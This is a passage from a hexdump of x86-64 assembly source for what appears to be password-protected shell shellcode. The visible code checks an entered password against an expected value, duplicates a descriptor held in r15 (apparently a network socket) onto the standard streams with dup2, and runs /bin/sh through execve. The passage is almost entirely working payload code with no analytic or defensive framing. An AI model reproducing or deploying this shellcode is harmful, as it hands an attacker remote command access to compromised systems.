000014e0  20 20 20 20 78 6f 72 20  72 63 78 2c 20 72 63 78  |    xor rcx, rcx|
000014f0  0a 20 20 20 20 20 20 69  6e 63 20 72 63 78 0a 20  |.      inc rcx. |
00001500  20 20 20 20 20 70 75 73  68 20 72 73 70 0a 20 20  |     push rsp.  |
00001510  20 20 20 20 70 6f 70 20  72 64 69 0a 20 20 20 20  |    pop rdi.    |
00001520  20 20 70 75 73 68 20 65  78 70 5f 70 61 73 73 0a  |  push exp_pass.|
00001530  20 20 20 20 20 20 70 75  73 68 20 72 73 70 0a 20  |      push rsp. |
00001540  20 20 20 20 20 70 6f 70  20 72 73 69 0a 20 20 20  |     pop rsi.   |
00001550  20 20 20 63 6d 70 73 71  0a 20 20 20 20 20 20 6a  |   cmpsq.      j|
00001560  6e 65 20 70 61 73 73 66  61 69 6c 20 20 20 20 20  |ne passfail     |
00001570  20 20 20 20 20 3b 20 70  61 73 73 77 64 20 6d 61  |     ; passwd ma|
00001580  74 63 68 2c 20 67 69 76  65 20 73 68 65 6c 6c 0a  |tch, give shell.|
00001590  20 0a 73 68 65 6c 6c 3a  0a 20 20 20 20 3b 20 2d  | .shell:.    ; -|
000015a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000015d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 0a 20  |--------------. |
000015e0  20 20 20 3b 20 36 2e 20  65 78 65 63 20 73 68 65  |   ; 6. exec she|
000015f0  6c 6c 0a 20 20 20 20 3b  20 2d 2d 2d 2d 2d 2d 2d  |ll.    ; -------|
00001600  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00001630  2d 2d 2d 2d 2d 2d 2d 2d  0a 20 0a 20 20 20 20 20  |--------. .     |
00001640  20 61 64 64 20 63 6c 2c  20 32 0a 20 20 20 20 20  | add cl, 2.     |
00001650  20 6d 6f 76 20 72 64 69  2c 20 72 31 35 0a 64 75  | mov rdi, r15.du|
00001660  70 5f 6c 6f 6f 70 3a 0a  20 20 20 20 20 20 70 75  |p_loop:.      pu|
00001670  73 68 20 72 63 78 20 20  20 20 20 20 20 20 20 20  |sh rcx          |
00001680  20 20 20 20 3b 20 68 61  76 65 20 74 6f 20 73 61  |    ; have to sa|
00001690  76 65 20 72 63 78 20 61  73 20 64 75 70 32 0a 20  |ve rcx as dup2. |
000016a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000016b0  20 20 20 3b 20 63 68 61  6e 67 65 73 20 69 74 27  |   ; changes it'|
000016c0  73 20 76 61 6c 75 65 0a  20 20 20 20 20 20 78 6f  |s value.      xo|
000016d0  72 20 72 61 78 2c 20 72  61 78 0a 20 20 20 20 20  |r rax, rax.     |
000016e0  20 73 75 62 20 72 63 78  2c 20 31 0a 20 20 20 20  | sub rcx, 1.    |
000016f0  20 20 70 75 73 68 20 72  63 78 0a 20 20 20 20 20  |  push rcx.     |
00001700  20 70 6f 70 20 72 73 69  0a 20 20 20 20 20 20 61  | pop rsi.      a|
00001710  64 64 20 61 6c 2c 20 73  79 73 5f 64 75 70 32 0a  |dd al, sys_dup2.|
00001720  20 20 20 20 20 20 73 79  73 63 61 6c 6c 0a 20 20  |      syscall.  |
00001730  20 20 20 20 70 6f 70 20  72 63 78 20 20 20 20 20  |    pop rcx     |
00001740  20 20 20 20 20 20 20 20  20 20 3b 20 72 65 73 74  |          ; rest|
00001750  6f 72 65 20 74 68 65 20  63 6f 75 6e 74 65 72 0a  |ore the counter.|
00001760  20 20 20 20 20 20 6c 6f  6f 70 20 64 75 70 5f 6c  |      loop dup_l|
00001770  6f 6f 70 0a 20 0a 20 20  20 20 20 20 6a 6d 70 20  |oop. .      jmp |
00001780  6d 79 74 65 78 74 0a 20  0a 63 6f 64 65 3a 0a 20  |mytext. .code:. |
00001790  20 20 20 70 6f 70 20 72  64 69 0a 20 20 20 20 6d  |   pop rdi.    m|
000017a0  6f 76 20 5b 72 64 69 2b  37 5d 2c 20 42 59 54 45  |ov [rdi+7], BYTE|
000017b0  20 61 6c 0a 20 20 20 20  70 75 73 68 20 72 61 78  | al.    push rax|
000017c0  0a 20 20 20 20 70 75 73  68 20 72 61 78 0a 20 20  |.    push rax.  |
000017d0  20 20 70 6f 70 20 72 73  69 0a 20 20 20 20 70 6f  |  pop rsi.    po|
000017e0  70 20 72 64 78 0a 20 20  20 20 61 64 64 20 61 6c  |p rdx.    add al|
000017f0  2c 20 73 79 73 5f 65 78  65 63 76 65 0a 20 20 20  |, sys_execve.   |
00001800  20 73 79 73 63 61 6c 6c  0a 20 0a 6d 79 74 65 78  | syscall. .mytex|
00001810  74 3a 0a 20 20 20 20 63  61 6c 6c 20 63 6f 64 65  |t:.    call code|
00001820  0a 20 20 20 20 4d 79 54  65 78 74 3a 20 64 62 20  |.    MyText: db |
00001830  27 2f 62 69 6e 2f 73 68  27 2c 20 30 78 34 31 0a  |'/bin/sh', 0x41.|
00001840  20 0a 70 61 73 73 66 61  69 6c 3a                 | .passfail:|
0000184b
